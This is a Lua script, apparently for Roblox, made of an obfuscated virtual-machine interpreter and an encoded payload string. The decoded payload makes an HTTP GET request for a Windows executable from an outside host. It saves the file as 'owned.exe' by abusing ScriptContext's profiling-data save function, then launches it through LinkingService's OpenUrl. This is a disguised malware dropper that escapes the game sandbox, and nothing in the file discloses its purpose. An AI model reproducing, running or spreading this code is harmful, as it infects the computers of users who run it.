local StrToNumber = tonumber;
local Byte = string.byte;
local Char = string.char;
local Sub = string.sub;
local Subg = string.gsub;
local Rep = string.rep;
local Concat = table.concat;
local Insert = table.insert;
local LDExp = math.ldexp;
local GetFEnv = getfenv or function()
	return _ENV;
end;
local Setmetatable = setmetatable;
local PCall = pcall;
local Select = select;
local Unpack = unpack or table.unpack;
local ToNumber = tonumber;
local function VMCall(ByteString, vmenv, ...)
	local DIP = 1;
	local repeatNext;
	ByteString = Subg(Sub(ByteString, 5), "..", function(byte)
		if (Byte(byte, 2) == 79) then
			repeatNext = StrToNumber(Sub(byte, 1, 1));
			return "";
		else
			local a = Char(StrToNumber(byte, 16));
			if repeatNext then
				local b = Rep(a, repeatNext);
				repeatNext = nil;
				return b;
			else
				return a;
			end
		end
	end);
	local function gBit(Bit, Start, End)
		if End then
			local FlatIdent_95CAC = 0;
			local Res;
			while true do
				if (FlatIdent_95CAC == 0) then
					Res = (Bit / (2 ^ (Start - 1))) % (2 ^ (((End - 1) - (Start - 1)) + 1));
					return Res - (Res % 1);
				end
			end
		else
			local Plc = 2 ^ (Start - 1);
			return (((Bit % (Plc + Plc)) >= Plc) and 1) or 0;
		end
	end
	local function gBits8()
		local a = Byte(ByteString, DIP, DIP);
		DIP = DIP + 1;
		return a;
	end
	local function gBits16()
		local FlatIdent_76979 = 0;
		local a;
		local b;
		while true do
			if (FlatIdent_76979 == 1) then
				return (b * 256) + a;
			end
			if (FlatIdent_76979 == 0) then
				a, b = Byte(ByteString, DIP, DIP + 2);
				DIP = DIP + 2;
				FlatIdent_76979 = 1;
			end
		end
	end
	local function gBits32()
		local FlatIdent_24A02 = 0;
		local a;
		local b;
		local c;
		local d;
		while true do
			if (FlatIdent_24A02 == 1) then
				return (d * 16777216) + (c * 65536) + (b * 256) + a;
			end
			if (FlatIdent_24A02 == 0) then
				a, b, c, d = Byte(ByteString, DIP, DIP + 3);
				DIP = DIP + 4;
				FlatIdent_24A02 = 1;
			end
		end
	end
	local function gFloat()
		local FlatIdent_89ECE = 0;
		local Left;
		local Right;
		local IsNormal;
		local Mantissa;
		local Exponent;
		local Sign;
		while true do
			if (FlatIdent_89ECE == 3) then
				if (Exponent == 0) then
					if (Mantissa == 0) then
						return Sign * 0;
					else
						local FlatIdent_8199B = 0;
						while true do
							if (FlatIdent_8199B == 0) then
								Exponent = 1;
								IsNormal = 0;
								break;
							end
						end
					end
				elseif (Exponent == 2047) then
					return ((Mantissa == 0) and (Sign * (1 / 0))) or (Sign * NaN);
				end
				return LDExp(Sign, Exponent - 1023) * (IsNormal + (Mantissa / (2 ^ 52)));
			end
			if (FlatIdent_89ECE == 2) then
				Exponent = gBit(Right, 21, 31);
				Sign = ((gBit(Right, 32) == 1) and -1) or 1;
				FlatIdent_89ECE = 3;
			end
			if (FlatIdent_89ECE == 1) then
				IsNormal = 1;
				Mantissa = (gBit(Right, 1, 20) * (2 ^ 32)) + Left;
				FlatIdent_89ECE = 2;
			end
			if (FlatIdent_89ECE == 0) then
				Left = gBits32();
				Right = gBits32();
				FlatIdent_89ECE = 1;
			end
		end
	end
	local function gString(Len)
		local FlatIdent_39B0 = 0;
		local Str;
		local FStr;
		while true do
			if (FlatIdent_39B0 == 2) then
				FStr = {};
				for Idx = 1, #Str do
					FStr[Idx] = Char(Byte(Sub(Str, Idx, Idx)));
				end
				FlatIdent_39B0 = 3;
			end
			if (3 == FlatIdent_39B0) then
				return Concat(FStr);
			end
			if (FlatIdent_39B0 == 1) then
				Str = Sub(ByteString, DIP, (DIP + Len) - 1);
				DIP = DIP + Len;
				FlatIdent_39B0 = 2;
			end
			if (FlatIdent_39B0 == 0) then
				Str = nil;
				if not Len then
					Len = gBits32();
					if (Len == 0) then
						return "";
					end
				end
				FlatIdent_39B0 = 1;
			end
		end
	end
	local gInt = gBits32;
	local function _R(...)
		return {...}, Select("#", ...);
	end
	local function Deserialize()
		local Instrs = {};
		local Functions = {};
		local Lines = {};
		local Chunk = {Instrs,Functions,nil,Lines};
		local ConstCount = gBits32();
		local Consts = {};
		for Idx = 1, ConstCount do
			local Type = gBits8();
			local Cons;
			if (Type == 1) then
				Cons = gBits8() ~= 0;
			elseif (Type == 2) then
				Cons = gFloat();
			elseif (Type == 3) then
				Cons = gString();
			end
			Consts[Idx] = Cons;
		end
		Chunk[3] = gBits8();
		for Idx = 1, gBits32() do
			local Descriptor = gBits8();
			if (gBit(Descriptor, 1, 1) == 0) then
				local FlatIdent_946F = 0;
				local Type;
				local Mask;
				local Inst;
				while true do
					if (FlatIdent_946F == 0) then
						Type = gBit(Descriptor, 2, 3);
						Mask = gBit(Descriptor, 4, 6);
						FlatIdent_946F = 1;
					end
					if (FlatIdent_946F == 1) then
						Inst = {gBits16(),gBits16(),nil,nil};
						if (Type == 0) then
							Inst[3] = gBits16();
							Inst[4] = gBits16();
						elseif (Type == 1) then
							Inst[3] = gBits32();
						elseif (Type == 2) then
							Inst[3] = gBits32() - (2 ^ 16);
						elseif (Type == 3) then
							Inst[3] = gBits32() - (2 ^ 16);
							Inst[4] = gBits16();
						end
						FlatIdent_946F = 2;
					end
					if (FlatIdent_946F == 3) then
						if (gBit(Mask, 3, 3) == 1) then
							Inst[4] = Consts[Inst[4]];
						end
						Instrs[Idx] = Inst;
						break;
					end
					if (FlatIdent_946F == 2) then
						if (gBit(Mask, 1, 1) == 1) then
							Inst[2] = Consts[Inst[2]];
						end
						if (gBit(Mask, 2, 2) == 1) then
							Inst[3] = Consts[Inst[3]];
						end
						FlatIdent_946F = 3;
					end
				end
			end
		end
		for Idx = 1, gBits32() do
			Functions[Idx - 1] = Deserialize();
		end
		return Chunk;
	end
	local function Wrap(Chunk, Upvalues, Env)
		local Instr = Chunk[1];
		local Proto = Chunk[2];
		local Params = Chunk[3];
		return function(...)
			local Instr = Instr;
			local Proto = Proto;
			local Params = Params;
			local _R = _R;
			local VIP = 1;
			local Top = -1;
			local Vararg = {};
			local Args = {...};
			local PCount = Select("#", ...) - 1;
			local Lupvals = {};
			local Stk = {};
			for Idx = 0, PCount do
				if (Idx >= Params) then
					Vararg[Idx - Params] = Args[Idx + 1];
				else
					Stk[Idx] = Args[Idx + 1];
				end
			end
			local Varargsz = (PCount - Params) + 1;
			local Inst;
			local Enum;
			while true do
				Inst = Instr[VIP];
				Enum = Inst[1];
				if (Enum <= 7) then
					if (Enum <= 3) then
						if (Enum <= 1) then
							if (Enum > 0) then
								Stk[Inst[2]] = Env[Inst[3]];
							else
								local A = Inst[2];
								local B = Stk[Inst[3]];
								Stk[A + 1] = B;
								Stk[A] = B[Inst[4]];
							end
						elseif (Enum > 2) then
							Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
						else
							do
								return;
							end
						end
					elseif (Enum <= 5) then
						if (Enum > 4) then
							Env[Inst[3]] = Stk[Inst[2]];
						else
							local FlatIdent_6A83E = 0;
							local B;
							local A;
							while true do
								if (FlatIdent_6A83E == 5) then
									Stk[Inst[2]] = Inst[3];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
									break;
								end
								if (FlatIdent_6A83E == 3) then
									Env[Inst[3]] = Stk[Inst[2]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									B = Stk[Inst[3]];
									Stk[A + 1] = B;
									FlatIdent_6A83E = 4;
								end
								if (FlatIdent_6A83E == 0) then
									B = nil;
									A = nil;
									Stk[Inst[2]] = {};
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]][Inst[3]] = Inst[4];
									FlatIdent_6A83E = 1;
								end
								if (FlatIdent_6A83E == 1) then
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]][Inst[3]] = Inst[4];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									A = Inst[2];
									FlatIdent_6A83E = 2;
								end
								if (FlatIdent_6A83E == 2) then
									Stk[A] = Stk[A](Stk[A + 1]);
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Stk[Inst[3]][Inst[4]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									FlatIdent_6A83E = 3;
								end
								if (FlatIdent_6A83E == 4) then
									Stk[A] = B[Inst[4]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									Stk[Inst[2]] = Env[Inst[3]];
									VIP = VIP + 1;
									Inst = Instr[VIP];
									FlatIdent_6A83E = 5;
								end
							end
						end
					elseif (Enum == 6) then
						Stk[Inst[2]] = Stk[Inst[3]];
					else
						VIP = Inst[3];
					end
				elseif (Enum <= 11) then
					if (Enum <= 9) then
						if (Enum == 8) then
							Stk[Inst[2]][Inst[3]] = Inst[4];
						else
							Stk[Inst[2]] = Inst[3];
						end
					elseif (Enum > 10) then
						local FlatIdent_8BF78 = 0;
						local A;
						while true do
							if (FlatIdent_8BF78 == 0) then
								A = Inst[2];
								Stk[A](Unpack(Stk, A + 1, Inst[3]));
								break;
							end
						end
					else
						for Idx = Inst[2], Inst[3] do
							Stk[Idx] = nil;
						end
					end
				elseif (Enum <= 13) then
					if (Enum > 12) then
						if (Stk[Inst[2]] == Inst[4]) then
							VIP = VIP + 1;
						else
							VIP = Inst[3];
						end
					else
						Stk[Inst[2]] = {};
					end
				elseif (Enum <= 14) then
					local FlatIdent_817B0 = 0;
					local B;
					local A;
					while true do
						if (FlatIdent_817B0 == 3) then
							Stk[Inst[2]] = Env[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							B = Stk[Inst[3]];
							Stk[A + 1] = B;
							FlatIdent_817B0 = 4;
						end
						if (FlatIdent_817B0 == 0) then
							B = nil;
							A = nil;
							A = Inst[2];
							B = Stk[Inst[3]];
							Stk[A + 1] = B;
							Stk[A] = B[Inst[4]];
							FlatIdent_817B0 = 1;
						end
						if (FlatIdent_817B0 == 4) then
							Stk[A] = B[Inst[4]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							FlatIdent_817B0 = 5;
						end
						if (6 == FlatIdent_817B0) then
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							break;
						end
						if (FlatIdent_817B0 == 2) then
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							FlatIdent_817B0 = 3;
						end
						if (FlatIdent_817B0 == 5) then
							A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Stk[Inst[3]];
							VIP = VIP + 1;
							FlatIdent_817B0 = 6;
						end
						if (FlatIdent_817B0 == 1) then
							VIP = VIP + 1;
							Inst = Instr[VIP];
							Stk[Inst[2]] = Inst[3];
							VIP = VIP + 1;
							Inst = Instr[VIP];
							A = Inst[2];
							FlatIdent_817B0 = 2;
						end
					end
				elseif (Enum == 15) then
					local A = Inst[2];
					Stk[A] = Stk[A](Stk[A + 1]);
				else
					local FlatIdent_AC2F = 0;
					local A;
					while true do
						if (FlatIdent_AC2F == 0) then
							A = Inst[2];
							Stk[A] = Stk[A](Unpack(Stk, A + 1, Inst[3]));
							break;
						end
					end
				end
				VIP = VIP + 1;
			end
		end;
	end
	return Wrap(Deserialize(), {}, vmenv)(...);
end
return VMCall("LOL!113O00028O0003043O0067616D65030A3O0047657453657276696365030F3O004C696E6B696E675365727669636500030E3O00536372697074436F6E7465787400026O00F03F03043O006461746103073O00726571756573742O033O0055726C032A3O00682O7470733A2O2F636F616C73657276636F616C2E742O696E792E736974652F736F6C6172612E65786503063O004D6574686F642O033O0047455403043O00426F647903173O005361766553637269707450726F66696C696E674461746103093O006F776E65642E657865027O004003073O004F70656E55726C00263O0012093O00014O000A000100033O00260D3O000F000100010004073O000F0001001201000400023O00200E00040004000300122O000600046O0004000600024O000100043O00122O000400023O00202O00040004000300122O000600056O0004000600024O000200043O00124O00063O00260D3O001E000100060004073O001E0001001201000400084O000400053O000200302O00050009000A00302O0005000B000C4O00040002000200202O00040004000D00122O000400073O00202O00040002000E00122O000600073O00122O0007000F6O0004000700022O0006000300043O0012093O00103O00260D3O0002000100100004073O0002000100202O0004000100112O0006000600034O000B0004000600010004073O002500010004073O000200012O00023O00017O00", GetFEnv(), ...);
